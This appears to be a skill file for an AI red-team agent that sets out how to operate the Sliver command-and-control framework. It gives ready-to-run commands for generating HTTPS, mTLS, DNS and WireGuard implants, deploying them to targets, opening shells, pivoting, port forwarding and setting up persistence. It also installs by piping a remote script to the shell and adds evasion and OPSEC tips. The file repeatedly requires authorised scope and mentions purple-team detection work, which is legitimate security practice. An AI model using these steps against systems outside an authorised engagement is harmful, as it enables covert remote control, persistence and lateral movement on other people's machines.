---
name: c2-sliver
description: "Command & Control with Sliver. Implant generation, HTTP/mTLS/DNS/WG tunnels for authorized red team simulations. REQUIRES EXPLICIT AUTHORIZATION."
category: red-team
allowed_tools:
  - sliver
  - havoc
  - python
  - curl
version: "1.0.0"
author: "MIRV"
requires_scope: true
ethical_warning: true
---

# Command & Control with Sliver Methodology

## 1. When to Use
- An authorised red-team simulation where you need a C2 framework with HTTP(S)/mTLS/DNS/WireGuard implants.
- You must demonstrate persistence + C2 reachability as part of an engagement deliverable.
- A purple-team exercise to validate blue-team C2 detections (beaconing, JA3, DNS tunneling, mTLS anomalies).
- You need a cross-platform C2 (Windows/Linux/macOS implants) for a multi-OS engagement.
- REQUIRES EXPLICIT WRITTEN AUTHORIZATION — C2 frameworks are illegal to deploy outside declared scope.

## 2. Prerequisites
- Written, signed authorisation covering the target hosts, the C2 domains/IPs, and the engagement window.
- A dedicated C2 server (VPS or on-prem) NOT on the client's production network — isolation is mandatory.
- `sliver` server installed (`curl https://sliver.sh/install | sh` or build from source) with operator accounts configured.
- A registered domain + TLS certificate for HTTPS listeners (Let's Encrypt via `sliver`'s `https` listener).
- DNS infrastructure for DNS listener (authoritative NS for a subdomain pointing to your C2).
- `python` and `curl` for implant staging and listener verification.
- OPSEC awareness: every C2 interaction is detectable (beacon timing, JA3, DNS query patterns, mTLS cert reuse).
- A staging/sandbox host for implant testing BEFORE deployment to in-scope targets.

## 3. Workflow
1. **Confirm scope and authorization**
   - Re-read the signed scope letter: confirm the target hosts, the C2 domains/IPs, and the time window.
   - If scope_guard cannot validate `{target}` against the engagement scope, STOP and request explicit permission.
2. **Start the Sliver server**
   - On the C2 VPS: `sliver` to enter the console, then `sliver > multiplayer on` to enable operator mode.
   - Configure operator configs: `sliver new-operator --name {op} --lhost {c2_ip} --lport 31337` → distribute the `.cfg` to operators.
   - Confirm the server is reachable: `nc -vz {c2_ip} 31337` from an operator host.
3. **Generate an implant**
   - HTTP(S) beacon: `sliver > generate beacon --http https://{domain}:443 --os windows --arch amd64 --save ./implants/ --seconds 5 --jitter 3`.
   - mTLS implant: `sliver > generate --mtls {c2_ip}:8888 --os linux --arch amd64 --save ./implants/`.
   - DNS implant: `sliver > generate --dns {domain}.ns.{domain}:53 --os windows --arch amd64 --save ./implants/`.
   - WireGuard implant: `sliver > generate --wg {c2_ip}:53 --save ./implants/`.
   - Beacons (vs sessions) are async and quieter; use `--seconds` + `--jitter` to shape beacon timing.
4. **Deploy the implant**
   - Transfer the implant to the in-scope target via an authorised vector (phishing payload, manual execution, prior access).
   - Execute: on Windows `.\implant.exe`; on Linux `chmod +x implant && ./implant`.
   - Confirm the beacon/session appears in `sliver > beacons` / `sliver > sessions`.
   - NEVER deploy the implant on a non-scope host — scope_guard should block the deployment if `{target}` is not validated.
5. **Establish and interact with a session**
   - `sliver > use {session_id}` → switch into the session context.
   - `sliver (session) > info` → confirm host, user, integrity, OS version.
   - `sliver (session) > shell` → interactive shell (noisy; prefer `execute` for single commands).
   - `sliver (session) > execute -o whoami /all` → single command with structured output.
   - For stealth: stay in beacon mode, run `pivots`/`portfwd` only when needed, avoid `shell`.
6. **Listener management**
   - HTTPS: `sliver > https --lhost 0.0.0.0 --lport 443 --domain {domain} --lets-encrypt --website ./www/`.
   - mTLS: `sliver > mtls --lhost 0.0.0.0 --lport 8888`.
   - DNS: `sliver > dns --domains {domain} --lhost 0.0.0.0 --lport 53`.
   - WireGuard: `sliver > wg --lhost 0.0.0.0 --lport 53`.
   - Verify each listener: `curl -k https://{domain}:443/` should return the decoy website, not an error.
7. **Pivot and persist (within scope)**
   - `sliver (session) > pivots start-tcp {listener_id}` → pivot through the compromised host to reach internal segments.
   - `sliver (session) > portfwd add --bind 127.0.0.1:8080 --remote {internal_ip}:80` → tunnel internal HTTP through the implant.
   - Persistence: `sliver (session) > persist run --method {registry|scheduled-task|service}` ONLY if explicitly authorised in scope.
8. **Map to MITRE ATT&CK**
   - **TA0011** Command & Control — primary tactic.
   - **T1071** Application Layer Protocol — HTTP/DNS C2.
   - **T1071.001** Web Protocols — HTTPS listener.
   - **T1071.004** DNS — DNS listener.
   - **T1573** Encrypted Channel — mTLS/WG.
   - **T1090** Proxy — pivots/portfwd.
9. **Decision point**: if a session is established on a high-value host (DC, database, executive workstation), pause and coordinate with the client before further action — the next step may trigger an IR response.

## 4. Verification
- Confirm the session is real: `sliver (session) > info` must return the target's hostname/user/OS matching the engagement scope.
- Verify the listener's TLS: `curl -v https://{domain}:443/` → JA3 fingerprint and certificate should match your configured profile.
- For DNS: `dig {random}.{domain} @8.8.8.8` → query must reach the C2 (check `sliver > dns` logs).
- Validate the beacon timing against your configured `--seconds`/`--jitter`; deviations indicate network filtering.
- Produce an activity log: `{timestamp, session, command, target, technique}` for every action — this is the engagement record.
- Capture the blue-team detection footprint: ask the client which alerts fired during the window (purple-team value).

## IMPORTANT
- ⚠️ AUTHORIZATION REQUIRED — C2 frameworks are illegal to deploy outside declared scope; this is not a lab toy.
- `requires_scope: true` — this skill only renders if scope_guard validates `{target}` against the engagement scope.
- C2 is detectable: beaconing, JA3, DNS patterns, mTLS cert reuse — assume a mature blue team sees you; OPSEC level: Loud.
- NEVER deploy an implant on a production host without explicit scope approval; use a dedicated lab for testing implants first.
- NEVER deploy an implant on a non-scope host — even a misconfigured target is out of scope; STOP and request permission.
- Document ALL activity: every command, timestamp, target, and outcome — the engagement report and the legal record depend on it.
- NEVER reuse C2 domains/IPs/certificates across engagements — fingerprinting lets blue teams catch you next time.
- NEVER share or store implant binaries, configs, or operator credentials in plaintext; MIRV `redact.py` masks them on mission save.
- Treat `{target}` / `{domain}` / `{c2_ip}` placeholders literally — never substitute unvalidated input.
- Tear down listeners and purge sessions at engagement end; confirm with `sliver > sessions` that none remain.
- If scope_guard denies the target, STOP and request explicit permission via the MIRV permission prompt system.
